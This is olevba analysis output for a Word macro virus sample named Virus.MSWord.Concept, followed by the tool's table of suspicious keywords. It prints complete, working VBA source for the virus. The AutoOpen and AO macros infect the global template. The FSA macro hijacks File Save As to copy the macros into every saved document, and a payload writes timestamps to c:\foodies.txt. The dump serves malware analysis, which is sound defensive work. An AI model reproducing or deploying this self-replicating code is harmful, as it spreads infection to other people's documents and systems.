olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Concept-d0609645fc0dfbc44d8528adfb87c580813476f1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Concept-d0609645fc0dfbc44d8528adfb87c580813476f1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO aUTOOpen.bas 
in file: Virus.MSWord.Concept-d0609645fc0dfbc44d8528adfb87c580813476f1 - OLE stream: 'Macros/VBA/aUTOOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim XMacroCount
Dim n
Dim XFileSaveAs
Dim XFileName$
Dim XMacro$
Dim aDate$
Dim aTime$
Dim aWriteFile$
Dim aLoop
    
    On Error GoTo -1: On Error GoTo Abort

    'GetPB$ = GetPrivateProfileString$("ffnetapi.novaxserverlist", \
    ' "server", "C:\windows\firefox.ini")
    
    ' If GetPB$ = "pbn1" Then
    '   Goto Abort
    '   End If
    
    XMacroCount = WordBasic.CountMacros(0, 0)

    For n = 1 To XMacroCount
        If WordBasic.[MacroName$](n, 0, 0) = "FileSaveAs" Then
        XFileSaveAs = -1
        End If
    Next n

    If Not XFileSaveAs Then
        XFileName$ = WordBasic.[FileName$]()
        XMacro$ = XFileName$ + ":FSA"
        WordBasic.MacroCopy XMacro$, "Global:FileSaveAs"
        XMacro$ = XFileName$ + ":FSA"
        WordBasic.MacroCopy XMacro$, "Global:FSA"
        XMacro$ = XFileName$ + ":AO"
        WordBasic.MacroCopy XMacro$, "Global:AO"
        End If

Abort:

aDate$ = WordBasic.[Date$]()
    aTime$ = WordBasic.[Time$]()
    aWriteFile$ = aDate$ + " " + aTime$
    Open "c:\foodies.txt" For Append As 1
    
    For aLoop = 1 To 100
    Print #1, aWriteFile$; " ";
    Next aLoop
    Close 1

End Sub
-------------------------------------------------------------------------------
VBA MACRO FSA.bas 
in file: Virus.MSWord.Concept-d0609645fc0dfbc44d8528adfb87c580813476f1 - OLE stream: 'Macros/VBA/FSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
    On Error GoTo -1: On Error GoTo Abort
    WordBasic.CurValues.FileSaveAs dlg
    WordBasic.Dialog.FileSaveAs dlg
    If dlg.Format = 0 Then dlg.Format = 1
    sMe$ = WordBasic.[FileName$]()
    sTMacro$ = sMe$ + ":aUTOOpen"
    WordBasic.MacroCopy "Global:AO", sTMacro$
    sTMacro$ = sMe$ + ":AO"
    WordBasic.MacroCopy "Global:AO", sTMacro$
    sTMacro$ = sMe$ + ":FSA"
    WordBasic.MacroCopy "Global:FSA", sTMacro$
    sTMacro$ = sMe$ + ":ActualVirus"
    WordBasic.MacroCopy "Global:ActualVirus", sTMacro$
    WordBasic.FileSaveAs dlg
    GoTo Done

Abort:
    If Err.Number <> 102 Then
        WordBasic.FileSaveAs dlg
    End If

Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AO.bas 
in file: Virus.MSWord.Concept-d0609645fc0dfbc44d8528adfb87c580813476f1 - OLE stream: 'Macros/VBA/AO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim XMacroCount
Dim n
Dim XFileSaveAs
Dim XFileName$
Dim XMacro$
Dim aDate$
Dim aTime$
Dim aWriteFile$
Dim aLoop
    
    On Error GoTo -1: On Error GoTo Abort

    'GetPB$ = GetPrivateProfileString$("ffnetapi.novaxserverlist", \
    ' "server", "C:\windows\firefox.ini")
    
    ' If GetPB$ = "pbn1" Then
    '   Goto Abort
    '   End If
    
    XMacroCount = WordBasic.CountMacros(0, 0)

    For n = 1 To XMacroCount
        If WordBasic.[MacroName$](n, 0, 0) = "FileSaveAs" Then
        XFileSaveAs = -1
        End If
    Next n

    If Not XFileSaveAs Then
        XFileName$ = WordBasic.[FileName$]()
        XMacro$ = XFileName$ + ":FSA"
        WordBasic.MacroCopy XMacro$, "Global:FileSaveAs"
        XMacro$ = XFileName$ + ":FSA"
        WordBasic.MacroCopy XMacro$, "Global:FSA"
        XMacro$ = XFileName$ + ":AO"
        WordBasic.MacroCopy XMacro$, "Global:AO"
        End If

Abort:

aDate$ = WordBasic.[Date$]()
    aTime$ = WordBasic.[Time$]()
    aWriteFile$ = aDate$ + " " + aTime$
    Open "c:\foodies.txt" For Append As 1
    
    For aLoop = 1 To 100
    Print #1, aWriteFile$; " ";
    Next aLoop
    Close 1

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |aUTOOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

